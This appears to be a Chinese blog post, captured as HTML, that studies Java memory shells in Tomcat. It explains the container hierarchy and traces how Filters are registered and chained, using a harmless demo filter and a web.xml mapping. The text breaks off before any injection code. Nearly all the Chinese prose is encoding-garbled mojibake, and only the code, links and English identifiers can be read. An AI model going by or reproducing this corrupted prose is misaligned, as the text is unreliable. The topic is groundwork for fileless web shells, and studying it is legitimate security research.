        <content type="html"><![CDATA[<p>å¼€å¯ä¸€ä¸ªè¡¥æ¼çš„ç¯‡ç« ï¼Œå†…å­˜åªæ˜¯å¬è¯´è¿‡è¿˜ä»æ¥æ²¡æœ‰ç»†ç»†å­¦è¿‡ã€‚æœ¬ç¯‡å°±è®°å½•ä¸‹è‡ªå·±å­¦ä¹ javaå†…å­˜é©¬çš„è¿‡ç¨‹ã€‚</p><h2 id="1-å‰ç½®åŸºç¡€"><a href="#1-å‰ç½®åŸºç¡€" class="headerlink" title="1.å‰ç½®åŸºç¡€"></a>1.å‰ç½®åŸºç¡€</h2><p>åœ¨å¼€å§‹å­¦ä¸‹ä¹‹å‰æˆ‘ä»¬å…ˆæ¥äº†è§£ä»€ä¹ˆæ˜¯servletå®¹å™¨ï¼Œè¿™é‡Œä»¥tomcatä¸ºä¾‹ã€‚</p><p>webå®¹å™¨çš„æ¦‚å¿µå‚è€ƒï¼š<a href="https://blog.csdn.net/hzk1562110692/article/details/94295947">https://blog.csdn.net/hzk1562110692/article/details/94295947</a></p><p>tomcatåŸç†å‚è€ƒï¼š</p><p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p><p><a href="https://tuonioooo-notebook.gitbook.io/performance-optimization/webrong-qi-you-hua/tomcatrong-qi-you-hua-pian/tomcatrong-qi-nei-bu-yuan-li">https://tuonioooo-notebook.gitbook.io/performance-optimization/webrong-qi-you-hua/tomcatrong-qi-you-hua-pian/tomcatrong-qi-nei-bu-yuan-li</a></p><p><a href="https://maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li">https://maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li</a></p><p>è¿™ä¸¤ç¯‡æ–‡ç« å¤§è‡´ä»‹ç»äº†è¯·æ±‚ å“åº”æµç¨‹</p><p>tomcatæºç è°ƒè¯•å‚è€ƒï¼š<a href="https://blog.csdn.net/zhuiyisinian/article/details/105617138">https://blog.csdn.net/zhuiyisinian/article/details/105617138</a></p><p>è¿™é‡Œå‚è€ƒ<a href="https://xz.aliyun.com/t/13638">https://xz.aliyun.com/t/13638</a> è¯¥æ–‡ç« ä»¥åŠtomacatåŸç†å‚è€ƒä¸­çš„ç¬¬ä¸€ç¯‡æ–‡ç« è¯¦ç»†è®°å½•ä¸‹</p><p>æˆ‘è¿™é‡Œç›´æ¥copy<a href="https://xz.aliyun.com/t/13638">https://xz.aliyun.com/t/13638</a> è¿™ç¯‡æ–‡ç« ã€‚ä½†è¿˜æ˜¯è¦ç»“åˆä¸Šé¢tomcatå‚è€ƒçš„çœ‹ä¸€ä¸‹æ›´æ¸…æ¥šæµç¨‹ã€‚</p><p>Tomcatè®¾è®¡äº†å››ç§å®¹å™¨ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextå’ŒWrapperï¼Œå…¶å…³ç³»å¦‚ä¸‹ï¼š<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714812004673-e793f486-f91c-4297-b7e7-8fdde01b71a9.png"></p><p>æ­¤æ—¶ï¼Œè®¾æƒ³è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šæˆ‘ä»¬æ­¤æ—¶è¦è®¿é—®<a href="https://manage.xxx.com:8080/user/list%EF%BC%8C%E9%82%A3tomcat%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E8%AF%B7%E6%B1%82%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%85%B7%E4%BD%93%E7%9A%84servlet%E7%9A%84%E5%91%A2%EF%BC%9F%E4%B8%BA%E6%AD%A4tomcat%E8%AE%BE%E8%AE%A1%E4%BA%86Mapper%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%BF%9D%E5%AD%98%E4%BA%86%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6%E4%B8%8E%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%E7%9A%84%E6%98%A0%E5%B0%84%E5%85%B3%E7%B3%BB%E3%80%82">https://manage.xxx.com:8080/user/listï¼Œé‚£tomcatæ˜¯å¦‚ä½•å®ç°è¯·æ±‚å®šä½åˆ°å…·ä½“çš„servletçš„å‘¢ï¼Ÿä¸ºæ­¤tomcatè®¾è®¡äº†Mapperï¼Œå…¶ä¸­ä¿å­˜äº†å®¹å™¨ç»„ä»¶ä¸è®¿é—®è·¯å¾„çš„æ˜ å°„å…³ç³»ã€‚</a></p><p>ç„¶åå°±å¼€å§‹å››æ­¥èµ°ï¼š</p><ol><li>æ ¹æ®åè®®å’Œç«¯å£å·é€‰å®šServiceå’ŒEngineã€‚æˆ‘ä»¬çŸ¥é“Tomcatçš„æ¯ä¸ªè¿æ¥å™¨éƒ½ç›‘å¬ä¸åŒçš„ç«¯å£ï¼Œæ¯”å¦‚Tomcaté»˜è®¤çš„HTTPè¿æ¥å™¨ç›‘å¬8080ç«¯å£ã€é»˜è®¤çš„AJPè¿æ¥å™¨ç›‘å¬8009ç«¯å£ã€‚ä¸Šé¢ä¾‹å­ä¸­çš„URLè®¿é—®çš„æ˜¯8080ç«¯å£ï¼Œå› æ­¤è¿™ä¸ªè¯·æ±‚ä¼šè¢«HTTPè¿æ¥å™¨æ¥æ”¶ï¼Œè€Œä¸€ä¸ªè¿æ¥å™¨æ˜¯å±äºä¸€ä¸ªServiceç»„ä»¶çš„ï¼Œè¿™æ ·Serviceç»„ä»¶å°±ç¡®å®šäº†ã€‚æˆ‘ä»¬è¿˜çŸ¥é“ä¸€ä¸ªServiceç»„ä»¶é‡Œé™¤äº†æœ‰å¤šä¸ªè¿æ¥å™¨ï¼Œè¿˜æœ‰ä¸€ä¸ªå®¹å™¨ç»„ä»¶ï¼Œå…·ä½“æ¥è¯´å°±æ˜¯ä¸€ä¸ªEngineå®¹å™¨ï¼Œå› æ­¤Serviceç¡®å®šäº†ä¹Ÿå°±æ„å‘³ç€Engineä¹Ÿç¡®å®šäº†ã€‚</li><li>æ ¹æ®åŸŸåé€‰å®šHostã€‚Serviceå’ŒEngineç¡®å®šåï¼ŒMapperç»„ä»¶é€šè¿‡urlä¸­çš„åŸŸåå»æŸ¥æ‰¾ç›¸åº”çš„Hostå®¹å™¨ï¼Œæ¯”å¦‚ä¾‹å­ä¸­çš„urlè®¿é—®çš„åŸŸåæ˜¯manage.xxx.comï¼Œå› æ­¤Mapperä¼šæ‰¾åˆ°Host1è¿™ä¸ªå®¹å™¨ã€‚</li><li>æ ¹æ®urlè·¯å¾„æ‰¾åˆ°Contextç»„ä»¶ã€‚Hostç¡®å®šä»¥åï¼ŒMapperæ ¹æ®urlçš„è·¯å¾„æ¥åŒ¹é…ç›¸åº”çš„Webåº”ç”¨çš„è·¯å¾„ï¼Œæ¯”å¦‚ä¾‹å­ä¸­è®¿é—®çš„æ˜¯&#x2F;userï¼Œå› æ­¤æ‰¾åˆ°äº†Context1è¿™ä¸ªContextå®¹å™¨ã€‚</li><li>æ ¹æ®urlè·¯å¾„æ‰¾åˆ°Wrapperï¼ˆServletï¼‰ã€‚Contextç¡®å®šåï¼ŒMapperå†æ ¹æ®web.xmlä¸­é…ç½®çš„Servletæ˜ å°„è·¯å¾„æ¥æ‰¾åˆ°å…·ä½“çš„Wrapperå’ŒServletï¼Œä¾‹å¦‚è¿™é‡Œçš„Wrapper1çš„&#x2F;listã€‚</li></ol><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714813938267-fbd3b097-e9fd-4279-bae3-af15bf6b2625.png"></p><p>ä»¥ä¸Šæ˜¯å‚è€ƒåˆ«äººçš„ï¼Œä¸‹é¢ç”¨è‡ªå·±çš„è¯ç®€å•æ¦‚æ‹¬ä¸€ä¸‹ï¼š</p><p>å°±æ˜¯è¯´è¿æ¥å™¨è´Ÿè´£ç›‘å¬å¤–ç•Œçš„è¯·æ±‚ç„¶åå°†è¯·æ±‚å°è£…æˆservletå¯¹è±¡å‘é€ç»™engineåœ¨ç”±enginçš„Mapperæ ¹æ®urlç­‰ä¿¡æ¯å»è°ƒç”¨contextåœ¨å»è°ƒç”¨wrapperå†å»è°ƒç”¨å…·ä½“servlet</p><h2 id="2-ä¼ ç»Ÿå†…å­˜é©¬"><a href="#2-ä¼ ç»Ÿå†…å­˜é©¬" class="headerlink" title="2.ä¼ ç»Ÿå†…å­˜é©¬"></a>2.ä¼ ç»Ÿå†…å­˜é©¬</h2><h3 id="2-1Filter-å†…å­˜é©¬"><a href="#2-1Filter-å†…å­˜é©¬" class="headerlink" title="2.1Filter å†…å­˜é©¬"></a>2.1Filter å†…å­˜é©¬</h3><p>filter ä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ Servlet æŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åœ¨ HttpServletRequest åˆ°è¾¾ Servlet ä¹‹å‰ï¼Œæ‹¦æˆªå®¢æˆ·çš„ HttpServletRequest ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥ HttpServletRequestï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ HttpServletRequest å¤´å’Œæ•°æ®ï¼›åœ¨ HttpServletResponse åˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‹¦æˆª HttpServletResponse ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥ HttpServletResponseï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ HttpServletResponse å¤´å’Œæ•°æ®ã€‚</p><p>å·¥ä½œåŸç†å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714821706305-574612a8-d1bc-4d2e-88dc-a08789fa38db.png"></p><p>åœ¨è°ƒè¯•åˆ†æä¹‹å‰è¿˜æ˜¯è¯´ä¸€å¥èƒ½å°½é‡çœ‹çœ‹tomactçš„æºç åˆ†æå°±å¤šçœ‹çœ‹ã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹filterå†…å­˜é©¬ç”¨çš„ä¸»è¦å‡ ä¸ªæ–¹æ³•ï¼š</p><ul><li>FilterDefsï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ï¼Œä½œç”¨ url ç­‰åŸºæœ¬ä¿¡æ¯</li><li>FilterConfigsï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯</li><li>FilterMapsï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern</li><li>FilterChainï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter</li><li>WebXmlï¼šå­˜æ”¾ web.xml ä¸­å†…å®¹çš„ç±»</li><li>ContextConfigï¼šWebåº”ç”¨çš„ä¸Šä¸‹æ–‡é…ç½®ç±»</li><li>StandardContextï¼šContextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper</li><li>StandardWrapperValveï¼šä¸€ä¸ª Wrapper çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Wrapper ä»£è¡¨ä¸€ä¸ªServlet</li></ul><p>ä¸‹é¢æˆ‘ä»¬å†™ä¸€ä¸ªfilterçš„demoçœ‹ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcat_demo_neicunma;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterdemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;diaoyong filter&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é…ç½®ä¸€ä¸‹web.xmlæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--è¿‡æ»¤å™¨é…ç½®--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.tomcat_demo_neicunma.filterdemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-1-1è®¿é—®filterä¹‹åçš„è°ƒç”¨"><a href="#2-1-1è®¿é—®filterä¹‹åçš„è°ƒç”¨" class="headerlink" title="2.1.1è®¿é—®filterä¹‹åçš„è°ƒç”¨"></a>2.1.1è®¿é—®filterä¹‹åçš„è°ƒç”¨</h4><p>ç„¶åæˆ‘ä»¬ç›´æ¥æ‰“ä¸€ä¸ªæ–­ç‚¹åœ¨dofilterä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917345344-c615db5b-5552-46c8-b904-82c3c661b110.png"></p><p>å¼€å¯è°ƒè¯•ï¼Œè¿™é‡Œæ¨èçœ‹tomcatçš„åˆ†æï¼Œå¯ä»¥å¾ˆè¯¦ç»†çš„äº†è§£æ¸…æ¥šåœ¨filterä¹‹åæµç¨‹è°ƒç”¨æ˜¯æ€ä¹ˆè¿è¡Œçš„ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917494259-a9cd4aba-ea46-4903-a647-f67f2bf94f25.png"></p><p>è¿™é‡Œæˆ‘ä»¬è‡ªå·±è·Ÿè·Ÿè·Ÿè¿›filterä¼šè¿›å…¥ApplicationFilterChainç±»é‡Œçš„dofilteræ–¹æ³•è¿™é‡Œçš„Globals.IS_SECURITY_ENABLEDï¼Œä¹Ÿå°±æ˜¯å…¨å±€å®‰å…¨æœåŠ¡æ˜¯å¦å¼€å¯çš„åˆ¤æ–­ã€‚</p><p>æˆ‘ä»¬ç»§ç»­è·Ÿä»–ä¼šè°ƒç”¨elseé‡Œé¢çš„internalDoFilteræ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917709111-550f931f-688f-4522-a9dd-c8350153b017.png"></p><p>ä¸»è¦æ˜¯è¦çœ‹ä¸€ä¸‹è¿™ä¸ªfilters</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917971557-6099595a-2995-45aa-8a8f-c5810d4b8060.png"></p><p>è¿™é‡Œè¿™ä¸ªfiltersä¸»è¦æ˜¯ç”¨æ¥å­˜å‚¨æˆ‘ä»¬è‡ªå®šä¹‰çš„filterå¯¹è±¡å’Œtomcatè‡ªå¸¦çš„filterçš„ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918131371-6d827c6e-0ff0-4325-ae1a-14e6341be117.png"></p><p>ç»§ç»­å¾€ä¸‹è·Ÿè¿›å‘ä¸‹è·å–å‡ºæ•°ç»„é‡Œçš„filter ç„¶åè°ƒç”¨filterçš„dofilteræ–¹æ³•ã€‚ç„¶åæˆ‘ä»¬åœ¨ç»§ç»­è·Ÿè¿›çš„æ—¶å€™å‘ç°åˆä¼šè°ƒç”¨åˆ°ApplicationFilterChainç±»é‡Œçš„dofilteræ–¹æ³•ï¼Œè¿™é‡Œå¯ä»¥å»ç½‘ä¸ŠæŸ¥ä¸€æŸ¥å…·ä½“æˆ‘å°±ä¸åœ¨ç»§ç»­è·Ÿäº†ï¼Œè‡ªå·±è§£é‡Šä¸€ä¸‹å°±æ˜¯filteræ˜¯ä¸€æ¡é“¾ä¼šä¸€ä¸ªä¸ªè·å–filterç„¶åæ‰§è¡Œfilteré‡Œé¢dofilteræ–¹æ³•ç›´åˆ°æœ€åä¸€ä¸ª</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918429489-5ad797a6-55ef-4262-87ea-642724d5b8ec.png"></p><p>æœ€åä¼šè°ƒç”¨åˆ°è¿™é‡Œå»è°ƒç”¨servletã€‚</p><p>:::tips<br>æœ€åä¸€ä¸ª filter è°ƒç”¨ servlet çš„ service æ–¹æ³•</p><p>ä¸Šä¸€ä¸ª Filter.doFilter() æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter() æ–¹æ³•å°†è°ƒç”¨ä¸‹ä¸€ä¸ª Filter.doFilter() æ–¹æ³•ï¼›è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ Filter é“¾ï¼Œæ˜¯å»é€ä¸ªè·å–çš„ã€‚</p><p>æœ€åä¸€ä¸ª Filter.doFilter() æ–¹æ³•ä¸­è°ƒç”¨çš„ FilterChain.doFilter() æ–¹æ³•å°†è°ƒç”¨ç›®æ ‡ Servlet.service() æ–¹æ³•ã€‚</p><p>åªè¦ Filter é“¾ä¸­ä»»æ„ä¸€ä¸ª Filter æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter() æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet.service() æ–¹æ³•éƒ½ä¸ä¼šè¢«æ‰§è¡Œã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„æ­£å‘åˆ†æè¿‡ç¨‹å°±ç»“æŸäº†ï¼Œå¾—åˆ°çš„ç»“è®ºæ˜¯ Filter Chain çš„è°ƒç”¨ç»“æ„æ˜¯ä¸€ä¸ªä¸ª doFilter() çš„ï¼Œæœ€åä¸€ä¸ª Filter ä¼šè°ƒç”¨ Servlet.service()</p><p>:::</p><p>è¿™é‡Œå‚è€ƒï¼š<a href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%9C%A8%E8%AE%BF%E9%97%AE-x2F-filter-%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%9C%A8%E8%AE%BF%E9%97%AE-x2F-filter-%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90</a>è¿™ä¸ªæ–‡ç« çš„è§£é‡Š</p><h4 id="2-1-2è®¿é—®filterä¹‹å‰çš„è°ƒç”¨"><a href="#2-1-2è®¿é—®filterä¹‹å‰çš„è°ƒç”¨" class="headerlink" title="2.1.2è®¿é—®filterä¹‹å‰çš„è°ƒç”¨"></a>2.1.2è®¿é—®filterä¹‹å‰çš„è°ƒç”¨</h4><p>è¿˜æ˜¯åŒæ ·çš„æˆ‘ä»¬ç›´æ¥åœ¨è‡ªå®šä¹‰çš„dofilteræ–¹æ³•é‡Œä¸‹ä¸€ä¸ªæ–­ç‚¹ç„¶åçœ‹çœ‹æ˜¯è°è°ƒç”¨äº†è¯¥æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927482149-3028d7cf-1a48-428b-b3d2-3808f25bc1df.png"></p><p>é€šè¿‡ideaçš„è°ƒç”¨æ ˆä»¥åŠå‚è€ƒç½‘ä¸Šçš„åˆ†æå¯ä»¥çœ‹åˆ°æ˜¯ApplicationFilterChainçš„internalDoFilteræ–¹æ³•ä¸­è°ƒç”¨äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„filteræ–¹æ³•ï¼Œç„¶åç»§ç»­å‘ä¸Šå¯»æ‰¾å‘ç°æ˜¯ApplicationFilterChainä¸‹çš„doFilterè°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œå†æ¥ç€å‘ä¸Šå¯»æ‰¾è°ƒç”¨æ ˆå‘ç°StandardWrapperValveç±»é‡Œé¢çš„invokeæ–¹æ³•ä¸­çš„filterchainè°ƒç”¨äº†doFilteræ–¹æ³•<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927708397-b995071b-016d-45ab-bba9-59a7eeb08821.png"></p><p>é‚£æˆ‘ä»¬ç»§ç»­çœ‹è¿™ä¸ªfilterChainæ˜¯ä»€ä¹ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927790744-70dd872e-e8ea-4926-b082-ac6e10378545.png"></p><p>å¾€ä¸Šç¿»å¯ä»¥çœ‹åˆ°æ˜¯ApplicationFilterChainè°ƒç”¨äº†createFilterChainæ–¹æ³•å¤å€¼ç»™ filterchainè·Ÿè¿›è¿™ä¸ªæ–¹æ³•çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928219779-74b1503a-3823-4298-8921-2513e2bc93c0.png"></p><p>ä¸‹é¢æ¯”è¾ƒé‡è¦çš„å°±æ˜¯ç®­å¤´æ‰€æŒ‡å‡ºçš„ä¸¤ä¸ªæ–¹æ³•ï¼Œè·å–filterMapsï¼ˆfilterMap ä¸»è¦å­˜æ”¾äº†è¿‡æ»¤å™¨çš„åå­—ä»¥åŠä½œç”¨çš„ </p><p>urlï¼‰å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928697066-2bdcfe9c-ac70-48eb-9541-82afdd287bda.png"></p><p>ç„¶åæœ‰ä¸€ä¸ªåˆ¤æ–­å¦‚æœæˆ‘ä»¬æ²¡æœ‰ç¼–å†™filteræ–¹æ³•ä¹Ÿå°±æ˜¯æ²¡åœ¨web.xmlæ–‡ä»¶ä¸­é…ç½®filterå¯¹è±¡ã€è·¯å¾„ç­‰ç­‰ä¹‹ç±»çš„ï¼Œå°±ç›´æ¥è¿”å›filterchainå¯¹è±¡å»è°ƒç”¨åé¢çš„servletã€‚</p><p>å¦‚æœä¸ä¸ºç©ºçš„è¯å°±éå† FilterMaps ä¸­çš„ FilterMapï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ FilterMap ä¸­çš„ urlPattern æƒ³åŒ¹é…ï¼Œå°±ä¼šè¿›å…¥ if åˆ¤æ–­ä¼šè°ƒç”¨ findFilterConfig æ–¹æ³•åœ¨ filterConfigs ä¸­å¯»æ‰¾å¯¹åº” filterNameåç§°çš„FilterConfigï¼Œç„¶åå¦‚æœä¸ä¸ºnullï¼Œå°±è¿›å…¥ if åˆ¤æ–­ï¼Œå°† filterConfig æ·»åŠ åˆ° filterChainä¸­ï¼Œçœ‹ä¸€ä¸‹filterconfigæ•°ç»„å±æ€§åŒ…å«filterdefã€filterç­‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929629775-79499f1a-8dbd-4489-a920-8334b459c638.png"></p><p>è·Ÿè¿›addFilterå‡½æ•°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929050800-9193fcf4-8ada-47a0-a15e-6546a5f7dfe1.png"></p><p>åœ¨addFilterå‡½æ•°ä¸­é¦–å…ˆä¼šéå†filtersï¼Œåˆ¤æ–­æˆ‘ä»¬çš„filteræ˜¯å¦å·²ç»å­˜åœ¨ï¼ˆå…¶å®å°±æ˜¯å»é‡ï¼‰</p><p>ä¸‹é¢è¿™ä¸ª if åˆ¤æ–­å…¶å®å°±æ˜¯æ‰©å®¹ï¼Œå¦‚æœ n å·²ç»ç­‰äºå½“å‰ filters çš„é•¿åº¦äº†å°±å†æ·»åŠ 10ä¸ªå®¹é‡ï¼Œæœ€åå°†æˆ‘ä»¬çš„filterConfig æ·»åŠ åˆ° filtersä¸­</p><p>åˆ°è¿™é‡Œå…¶å®å°±æ˜¯ç›¸å½“äºè·Ÿå®Œäº†filterçš„æ•´ä¸ªè°ƒç”¨é“¾ã€‚æ¥ä¸€å¼ ç»å…¸å›¾</p><p><img 